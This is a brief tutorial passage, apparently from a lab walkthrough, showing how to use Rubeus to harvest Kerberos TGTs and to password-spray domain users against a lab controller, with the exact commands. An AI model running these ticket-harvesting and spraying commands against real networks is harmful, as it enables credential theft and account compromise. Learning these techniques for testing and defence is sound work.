## Harvesting

Harvesting gathers tickets that are transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

This command tells Rubeus to harvest TGTs every 30 seconds

```sh
C:\Users\Administrator> Rubeus.exe harvest /interval:30
```

## Password Spraying

Before password spraying with Rubeus, you need to add the domain controller domain name to the Windows hosts file.

```sh
C:\Users\Administrator> echo 10.10.x.x CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts

C:\Users\Administrator> Rubeus.exe brute /password:YOUR_PASSWORD /noticket
```

This will take `YOUR_PASSWORD` and "spray" it against all found users, then give the `.kirbi` TGT for that user.

> Be mindful of how you use this attack, as it can lock you out of network access depending on account lockout policies.
